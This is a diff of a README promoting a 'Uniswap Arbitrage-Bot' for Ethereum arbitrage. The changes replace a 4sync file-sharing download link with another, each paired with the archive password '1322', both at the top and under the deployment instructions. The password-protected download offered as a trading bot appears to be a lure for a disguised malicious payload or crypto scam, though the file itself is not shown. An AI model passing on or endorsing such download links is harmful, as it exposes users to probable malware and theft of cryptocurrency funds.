@@ -9,7 +9,7 @@
 This analysis presents a comprehensive profitability model for **Uniswap Arbitrage-Bot** operations across three different deposit scenarios. The model evaluates optimal deposit sizes, target transaction ranges, daily trade frequencies, and risk-reward ratios for automated arbitrage operations on the Ethereum blockchain.
 
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 
@@ -309,7 +309,7 @@ graph TD
 
 ## 📋 Deployment Instructions
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 ### 🎯 Visual Step-by-Step Guide
